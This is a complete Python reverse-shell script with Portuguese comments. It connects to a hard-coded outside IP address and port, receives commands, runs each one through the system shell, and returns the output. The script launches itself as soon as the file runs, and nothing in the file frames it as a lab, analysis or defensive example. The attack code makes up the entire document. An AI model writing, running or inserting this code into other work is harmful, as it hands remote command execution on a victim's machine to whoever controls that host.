import socket
import subprocess
import os

def reverse_shell():
    # Configura o endereço IP e a porta do servidor
    servidor_ip = '3.148.177.247'  # Substitua pelo IP do servidor
    servidor_porta = 4555  # Substitua pela porta que você está usando

    # Cria um socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Conecta ao servidor
    s.connect((servidor_ip, servidor_porta))

    while True:
        # Recebe o comando do servidor
        comando = s.recv(1024).decode('utf-8')
        
        if comando.lower() == 'sair':
            break
        
        # Executa o comando e captura a saída
        if comando.startswith("cd "):
            try:
                os.chdir(comando.strip("cd "))
                s.send(b'Alterado para o diretório: ' + os.getcwd().encode('utf-8'))
            except FileNotFoundError as e:
                s.send(str(e).encode('utf-8'))
        else:
            resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
            s.send(resultado.stdout.encode('utf-8') + resultado.stderr.encode('utf-8'))

    s.close()

# Executa a reverse shell
reverse_shell()
